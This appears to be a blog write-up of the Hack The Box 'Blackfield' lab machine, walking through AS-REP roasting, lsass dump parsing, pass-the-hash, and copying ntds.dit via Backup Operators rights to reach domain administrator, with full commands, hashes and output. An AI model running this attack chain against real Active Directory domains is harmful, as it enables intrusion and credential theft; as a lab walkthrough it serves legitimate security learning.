---
layaout: post
image: /assets/images/blackfield.png
title: Blackfield Write Up HTB
date: 04-02-2025
categories: [Write ups]
tag: [Active Directory, As-Rep, Backup Operators]
excerpt: "Backfield is a Windows machine that involves exploiting Active Directory misconfigurations, performing AS-REP roasting to crack user passwords, and leveraging Backup Operators privileges. The attack involves SMB enumeration, retrieving credentials from lsass, and dumping the Active Directory database to obtain the domain administrator's hash."
---
![Escape Logo](/assets/images/blackfield.png)

**Backfield** is a Windows machine that involves exploiting Active Directory misconfigurations, performing AS-REP roasting to crack user passwords, and leveraging Backup Operators privileges. The attack involves SMB enumeration, retrieving credentials from lsass, and dumping the Active Directory database to obtain the domain administrator's hash.

## ENUMERATION
---
### Nmap scanning
---
As always we start enumerating with nmap

````bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.214 -sCV -vvv

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-04 21:52:48Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 55089/tcp): CLEAN (Timeout)
|   Check 3 (port 53637/udp): CLEAN (Timeout)
|   Check 4 (port 42455/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2025-02-04T21:52:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

````

We identified that the target environment is an Active Directory domain, specifically **BLACKFIELD.local**.

### Enumerating SMB
---
During SMB enumeration, we discovered that anonymous access is permitted to the **profiles$** share.

````bash
❯ smbclient -L //10.10.10.192/
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
````

Within the shared folder, we identified what appears to be a list of all domain user accounts.

````bash
❯ smbclient //10.10.10.192/profiles$
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 18:47:12 2020
  ..                                  D        0  Wed Jun  3 18:47:12 2020
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
  (continue)
````

All right, we now have a full list of domain usernames. In my case, I’ll copy them all and pass them to DeepSeek to generate a formatted list. 🌚

Alternatively, we can mount the SMB share on our machine and use `ls -1` to obtain the proper format for our wordlist.

````bash
❯ mount -t cifs //10.10.10.192/profiles$ /mnt
Password for root@//10.10.10.192/profiles$: 

❯ mv users users.new; ls -1 /mnt/ >users
❯ cat users
 File: users
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ AAlleni
   2   │ ABarteski
   3   │ ABekesz
   4   │ ABenzies
   5   │ ABiemiller
   6   │ AChampken
   7   │ ACheretei
   8   │ ACsonaki
   9   │ AHigchens
  10   │ AJaquemai
  11   │ AKlado
  12   │ AKoffenburger
  13   │ AKollolli
  14   │ AKruppe
  15   │ AKubale
  16   │ ALamerz
  17   │ AMaceldon
  18   │ AMasalunga
  19   │ ANavay
  (continue...)
````

## FOOTHOLD
---
### AS-REP roast
---
With the list of usernames, we will attempt an **AS-REP roasting attack**.

AS-REP roasting is a technique that targets accounts with **pre-authentication disabled** in Kerberos. This allows us to request an authentication response (AS-REP) without providing valid credentials, potentially retrieving a **Ticket Granting Ticket** that can be cracked offline.

````bash
❯ impacket-GetNPUsers BLACKFIELD.local/ -dc-ip 10.10.10.192 -usersfile users -format hashcat -no-pass

$krb5asrep$23$support@BLACKFIELD.LOCAL:52a58693d0317117ea1443f96fc60d74$afaab01aa7e9ba833f5dad0dc68e023f295d8c3144cf38a5eaadbf2a5b2061fb3115eaa3a706482459eec3fd978833d348c422c73934c6eadc5867176196f0bf3ce9dc2c10d3dc2c94fe6f490256b251e38d87f207b256fe4552f7b1ad8fb092fa0903c3c2ed2729264136049023f91fa3c0f89f82995da98076b936e7799582790116bbbdcc39a4752d911340c5862b4ff44692e130add4d31cba089cf8982b7676f65390e323e9f4e91f5973e580782cbfff5cfa478a764ef4fa1810a1cb71602c2d4c9faf6946f606f67086ebb059241f1963bf1acc90f43cf74decd23da6d97d62b983d19686cb7d900c120dba7ff9c6a2ea
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
````

From our results, both **audit2020** and **svc_backup** do not require pre-authentication. However, only the **support** user returns a **TGT**, making it a viable target for AS-REP roasting.
We will use **John the Ripper** to attempt cracking the **TGT (Ticket Granting Ticket)** and recover the user's plaintext password

````bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:12 DONE (2025-02-04 17:02) 0.08058g/s 1155Kp/s 1155Kc/s 1155KC/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
````

With this newly obtained user, we attempted to enumerate **LDAP**, access **SMB shares**, and authenticate via **WINRM**.

````bash
❯ ldapsearch -x -H ldap://10.10.10.192 -D "cn=support,dc=blackfield,dc=local" -w '#00^BlackKnight' -b "dc=blackfield,dc=local"
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090446, comment: AcceptSecurityContext error, data 52e, v4563
````

````bash
❯ nxc winrm 10.10.10.192 u 'support' -p '#00^BlackKnight'
WINRM       10.10.10.192    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
````

````bash
❯ smbclient -L //10.10.10.192/ -U support
Password for [WORKGROUP\support]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 
````

Unfortunately, we didn't find anything useful to progress our escalation, so we'll resort to using **BloodHound**.

**BloodHound** is a powerful tool for enumerating and analyzing Active Directory permissions. It helps identify potential attack paths by mapping out relationships between users, groups, and permissions within an Active Directory environment, often revealing ways to escalate privileges or compromise high-value targets.


### Enumerating our new user with BLOODHOUND
---
Now, we can use our powerful tool, **BloodHound**, to dump as much information as possible from the domain and check if we can find any potential attack vectors, such as **password changes** or other privileges we can exploit. BloodHound will help us identify misconfigurations or privilege escalation paths that might not be immediately obvious.

````bash
❯ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
````
I like to imagine that when I use this tool, I'm using the photo beacon from _Outer Wilds_
![outerwilds-bloodhound](/assets/saune/outerwilds.gif)

We discovered that we have the necessary permissions to change the password for the **AUDIT2020** user. This could potentially allow us to escalate our privileges or gain access to resources associated with this account.

![Usersweb](/assets/blackfield/bloodhound-change.png)

We can change the credentials for the **AUDIT2020** user using the following command, which **BloodHound** provides as a suggested method:

````bash
net rpc password "audit2020" "wharep@ssword2025" -U "BLACKFIELD.LOCAL/support%#00^BlackKnight" -S dc01.blackfield.local
````

After changing the password for **AUDIT2020**, we enumerated **SMB** again and found that we now have access to read the shared folder **'forensic'**. This could contain valuable information to further progress our exploitation.

````bash
smbmap -H 10.10.10.192 -u audit2020 -p 'wharep@ssword2025'
+] IP: 10.10.10.192:445        Name: BLACKFIELD.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        forensic                                                READ ONLY        Forensic / Audit share.
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                READ ONLY        Logon server share 
        profiles$                                               READ ONLY        
        SYSVOL                                                  READ ONLY        Logon ser
        
````

In the **SMB** share, the most interesting file we found is **lsass.zip**.

**lsass.exe** (Local Security Authority Subsystem Service) is a critical Windows process responsible for managing user authentication, such as login and credential verification. It stores sensitive data, including user hashes, and is often targeted during post-exploitation.

We'll extract **lsass.zip** and analyze its contents to see if we can find any valid credentials or other sensitive information.

````bash
❯ smbclient //10.10.10.192/forensic -U audit2020
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

                5102079 blocks of size 4096. 1693727 blocks available
smb: \> cd memory_analysis
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 22:28:33 2020
  ..                                  D        0  Thu May 28 22:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 22:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 22:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 22:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 22:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 22:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 22:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 22:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 22:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 22:27:53 2020
````

````bash
❯ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP  
````

Once we extracted the contents of **lsass.zip**, we'll use **pypykatz** to dump the information.

**pypykatz** is a Python tool that can parse and extract credentials from **LSASS** memory dumps. It is capable of retrieving plaintext passwords, NTLM hashes, and Kerberos tickets from a dump of the **Local Security Authority Subsystem Service (LSASS)** process, which stores sensitive authentication data.

After running **pypykatz** to dump the contents, we found an **NTLM hash** for the **svc_backup** user. This hash can be used for pass-the-hash attacks or cracked to recover the user's plaintext password.

````bash
❯  pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
````

### Pass the hash
---
Now, with the **NTLM hash** for the **svc_backup** service user, we'll perform a **Pass-the-Hash (PTH)** attack to authenticate via **WINRM**.

**Pass-the-Hash** is an attack technique where we use the **NTLM hash** of a user's password instead of the actual plaintext password to authenticate to a system. This allows us to bypass the need for cracking the password and directly gain access to systems that accept the hash for authentication, such as through **WINRM** in this case.

````powershell
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt

````

## PRIVILEGE ESCALATION
---
As usual in this type of CTF, we are part of a group that may be vulnerable to privilege escalation. In this case, we are part of the **Backup Operators** group.

The **Backup Operators** group is a built-in group in Windows that grants its members the ability to back up and restore files on the system, even if they do not have direct access to those files. Members of this group have elevated privileges, but they are often overlooked when it comes to privilege escalation, as they can access sensitive files such as the **NTDS.dit** file, which contains the Active Directory database, including user credentials and hashes.

Our goal is to leverage our membership in the **Backup Operators** group to try to copy the **NTDS.dit** file. Once we have a copy of the file, we can extract and crack the hashes stored inside it to potentially gain access to other user accounts or escalate our privileges further.

````powershell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami -groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
````

We created a file instructing **diskshadow** to create a copy of the **C:** drive onto the **Z:** drive, using the alias **whare**, and saved it with the **whare.dsh** extension. This extension helps the system determine which application should handle the file. However, different programs may use the **DSH** file extension for different types of data. We then compiled the file into **DOS** format for compatibility with the Windows host.

````bash
❯ cat whare.dsh
───────┬──────────────────────────────────────────────────────────────────────────────────
       │ File: whare.dsh
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ set context persistent nowriters
   2   │ add volume c: alias whare
   3   │ create
   4   │ expose %whare% z:
   5   │ unix2dos whare.dsh
───────┴──────────────────────────────────────────────────────────────────────────────────
❯ unix2dos whare.dsh
unix2dos: converting file whare.dsh to DOS format...
````

After compilation, we transferred the **whare.dsh** file to a temporary directory on the target system. The process was simplified by **evil-winrm**, which included a file upload feature, eliminating the need for traditional file transfer methods. We verified that the **whare.dsh** file was successfully uploaded to the **C:\temp** directory.

````powershell
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/4/2025   4:57 PM                temp


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> upload whare.dsh
                                        
Info: Uploading /home/whare/hackthebox/maquinas/blackfield/whare.dsh to C:\temp\whare.dsh
                                        
Data: 144 bytes of 144 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\temp> 
````

Executing the **dsh** file on the target system created a shadow copy of the **C:** drive on the **Z:** drive. With this in place, we are now able to copy the **ntds.dit** file to an accessible directory. 

````powershell
*Evil-WinRM* PS C:\temp> diskshadow /s whare.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  2/4/2025 4:58:29 PM

-> set context persistent nowriters
-> add volume c: alias whare
-> create
Alias whare for shadow ID {4d1fb59c-b986-4c0e-8d3a-26b502f31790} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {a7297c76-e2f5-4a8f-981b-57566037eac7} set as environment variable.
````

We used the **robocopy** utility to copy the **ntds.dit** file from the **Z:\windows** directory to our current working directory. Below are the commands used to reproduce this proof of concept:

````powershell
*Evil-WinRM* PS C:\temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, February 4, 2025 4:59:24 PM
   Source : z:\windows\ntds\
     Dest : C:\temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                  1	z:\windows\ntds\
	   New File  		 18.0 m	ntds.dit
  0.0%
````

o carry out this attack, it's essential to also acquire a copy of the **system hive**. Without this, extracting the hashes from the **ntds.dit** file wouldn't be possible.

A **hive** refers to a structured collection of registry keys, subkeys, and values within the Windows registry. It comprises a set of files that are loaded into memory when the operating system boots or when a user logs in. Each user creates a distinct hive upon logging in, which stores their profile data.

In our case, we retrieved the **system hive** from the target machine’s registry and placed it in the **temp** directory.

````powershell
*Evil-WinRM* PS C:\temp> reg save hklm\system C:\Temp\system
The operation completed successfully.
*Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/4/2025   4:58 PM            619 2025-02-04_16-58-31_DC01.cab
-a----         2/4/2025   1:42 PM       18874368 ntds.dit
-a----         2/4/2025   5:00 PM       17559552 system
-a----         2/4/2025   4:57 PM            108 whare.dsh
````

Next, we simply downloaded the files (this process may take some time).

````powershell
*Evil-WinRM* PS C:\temp> download ntds.dit
                                        
Info: Downloading C:\temp\ntds.dit to ntds.dit
                                        
Info: Download successful!
----------------------------------------------------------------------------
*Evil-WinRM* PS C:\temp> download system
                                        
Info: Downloading C:\temp\system to system
                                        
Info: Download successful!
````

## ROAD TO ADMINISTRATOR
---

### Dumping password hashes 
---
Now, we will use the **impacket-secretsdump** tool to extract the hashes from the **ntds.dit** file.

### Explanation:

- **impacket-secretsdump** is a tool from the **Impacket** suite that extracts credentials (such as NTLM hashes and Kerberos tickets) from **NTDS.dit** (the Active Directory database) and the **System Hive**.
- **-ntds ntds.dit**: Specifies the path to the **ntds.dit** file, which contains the Active Directory database.
- **-system system**: Points to the **System Hive** file, which contains critical information needed to decrypt the NTDS hashes.
- **local**: This is used to indicate that we are working on a local system (as opposed to a remote extraction).

Once executed, this tool will extract all relevant hashes (including NTLM) from the **ntds.dit** file, allowing us to crack them or use them for further exploitation.

````powershell
❯ impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:78e0033d60e6bd177c4dbd5cc0f97a9d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
````

### Pass the hash as Administrator
---
Now that we have successfully dumped the **NTLM hash** for the **Administrator** account, we can authenticate by performing another **Pass-the-Hash** attack.
Finally, we have successfully authenticated as the **Administrator**, gaining full control over the target system.
````powershell
❯ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt

````

![netrunner](/assets/images/netrunner.gif)